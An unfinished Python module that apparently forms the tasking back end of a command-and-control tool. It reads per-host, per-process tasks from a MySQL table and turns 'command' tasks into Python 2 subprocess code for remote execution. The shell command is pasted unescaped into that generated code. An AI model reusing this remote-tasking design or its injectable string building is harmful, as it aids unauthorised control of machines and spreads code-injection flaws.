import pymysql
from core.config import *


class Tasking(object):

    def __init__(self):
        # tries to open the database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        # exception raised during database connection
        except Exception:
            raise

    def close_database_connection(self):
        """
        DESCRIPTION:
            This function closes the database connection

        RETURNS
            None
        """
        if self.connection.open:
            self.connection.close()

    def has_tasking(self, hostname, process_id):
        """
        DESCRIPTION:
            This function queries the "tasks" table to determine if we have tasking

        RETURNS:
            Bool
        """
        # tries to query the "tasks" table for tasking
        try:
            with self.connection.cursor() as cursor:
                statement = "SELECT * FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
                cursor.execute(statement, (hostname, process_id))

                # if tasks
                if cursor.rowcount == 1:
                    return True

                # else no tasks
                else:
                    return False

        # exception raised during database query
        except Exception:
            raise

    def generate_command_code(self, command):
        """
        DESCRIPTION:
            This function generates Python 2.x code to execute a shell command

        RETURNS:
            String
        """
        # TO DO: add in full Popen() code here
        # TO DO: query "listeners" table and add in update code
        code = "import subprocess; subprocess.Popen('" + command + "', stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
        return code

    def get_tasking(self, hostname, process_id):
        """
        DESCRIPTION:
            This function gets tasking from the "tasks" table

        RETURNS:
            **** FILL OUT ****
        """
        # tries to query "tasks" table for tasking
        # only one row is returned (if applicable)
        try:
            with self.connection.cursor() as cursor:
                statement = "SELECT task_action, task_secondary FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
                cursor.execute(statement, (hostname, process_id))
                result = cursor.fetchone()

                if result[0] == "command":
                    return self.generate_command_code(result[1])

        # exception raised during database query
        except Exception:
            raise
